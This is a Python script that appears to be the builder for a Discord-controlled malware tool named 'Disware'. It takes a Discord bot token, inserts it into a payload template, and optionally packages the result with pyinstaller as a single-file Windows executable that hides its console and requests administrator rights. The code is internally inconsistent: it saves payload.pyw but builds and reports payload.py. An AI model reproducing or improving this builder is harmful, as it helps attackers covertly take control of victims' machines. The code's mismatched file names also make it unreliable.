import os
import colorama
from colorama import Fore, Style

def generate_payload(token):
    with open('payload.txt', 'r', encoding='utf-8') as file:
        payload_template = file.read()
    return payload_template.format(token=token)

if __name__ == "__main__":
    print(Fore.MAGENTA + fr"""
 ________  .__
\______ \ |__| ________  _  _______ _______   ____
 |    |  \|  |/  ___/\ \/ \/ /\__  \\_  __ \_/ __ \
 |    `   \  |\___ \  \     /  / __ \|  | \/\  ___/
/_______  /__/____  >  \/\_/  (____  /__|    \___  >
        \/        \/               \/            \/
    """ + Style.RESET_ALL)
    token = input("Enter your Discord bot token: ")
    try:
        payload = generate_payload(token)
        with open("payload.pyw", "w", encoding='utf-8') as file:
            file.write(payload)
        print(Fore.GREEN + "Payload created and saved as payload.py... Do you want to convert it to an .exe (Y/N)?")
        answer = input().strip().lower()
        if answer == 'y':
            os.popen("pip install pyinstaller")
            os.system("pyinstaller --onefile --noconsole --uac-admin --bootloader-ignore-signals --collect-all=discord --disable-windowed-traceback payload.py")
            print(Fore.GREEN + "Executable created as payload.exe")
        else:
            print(Fore.YELLOW + "No executable created.")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")
